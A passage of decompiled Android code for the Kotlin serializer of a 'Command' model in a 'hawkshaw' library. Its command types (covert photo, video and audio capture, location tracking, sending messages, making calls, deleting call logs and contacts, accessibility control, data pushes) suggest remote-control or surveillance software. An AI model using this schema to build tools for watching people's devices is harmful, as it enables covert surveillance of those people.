            r7.<init>((int) r8, (com.hawkshaw.library.datalayer.models.Command.CommandType) r9, (long) r10, (com.hawkshaw.library.datalayer.models.Command.ThumbnailRequest) r12, (com.hawkshaw.library.datalayer.models.Command.FileRequest) r13, (com.hawkshaw.library.datalayer.models.Command.FilesRequest) r14, (com.hawkshaw.library.datalayer.models.Command.DeletePendingPushFilesRequest) r15, (com.hawkshaw.library.datalayer.models.Command.DeleteFileRequest) r16, (com.hawkshaw.library.datalayer.models.Command.AddCallLogRequest) r17, (com.hawkshaw.library.datalayer.models.Command.DeleteCallLogRequest) r18, (com.hawkshaw.library.datalayer.models.Command.AddContactRequest) r19, (com.hawkshaw.library.datalayer.models.Command.DeleteContactRequest) r20, (com.hawkshaw.library.datalayer.models.Command.SendMessageRequest) r21, (com.hawkshaw.library.datalayer.models.Command.GetLocationRequest) r22, (com.hawkshaw.library.datalayer.models.Command.VibrateRequest) r23, (com.hawkshaw.library.datalayer.models.Command.FlashRequest) r24, (com.hawkshaw.library.datalayer.models.Command.TakePictureRequest) r25, (com.hawkshaw.library.datalayer.models.Command.RecordVideoRequest) r26, (com.hawkshaw.library.datalayer.models.Command.RecordAudioRequest) r27, (com.hawkshaw.library.datalayer.models.Command.PushDeviceInfoRequest) r28, (com.hawkshaw.library.datalayer.models.Command.OpenAppRequest) r29, (com.hawkshaw.library.datalayer.models.Command.MakeCallRequest) r30, (com.hawkshaw.library.datalayer.models.Command.DeviceAudioRequest) r31, (com.hawkshaw.library.datalayer.models.Command.OpenDeeplinkRequest) r32, (com.hawkshaw.library.datalayer.models.Command.LoginRequest) r33, (com.hawkshaw.library.datalayer.models.Command.ScheduleCommandRequest) r34, (com.hawkshaw.library.datalayer.models.Command.CancelScheduledCommandRequest) r35, (com.hawkshaw.library.datalayer.models.Command.AccessibilityCommandRequest) r36, (com.hawkshaw.library.datalayer.models.Command.StartRepeatPushDataRequest) r37, (com.hawkshaw.library.datalayer.models.Command.SetDynamicConfigRequest) r38, (com.hawkshaw.library.datalayer.models.Command.SyncAppConfigRequest) r39, (E3.q0) r40)
            return r0
        */
        throw new UnsupportedOperationException("Method not decompiled: com.hawkshaw.library.datalayer.models.Command$$serializer.deserialize(kotlinx.serialization.encoding.Decoder):com.hawkshaw.library.datalayer.models.Command");
    }

    public SerialDescriptor getDescriptor() {
        return descriptor;
    }

    public void serialize(Encoder encoder, Command command) {
        K.n(encoder, "encoder");
        K.n(command, "value");
        SerialDescriptor descriptor2 = getDescriptor();
        b a5 = encoder.a(descriptor2);
        Command.write$Self$library_release(command, a5, descriptor2);
        a5.c(descriptor2);
    }

    public KSerializer[] typeParametersSerializers() {
        return C0029h0.f501b;
    }
}
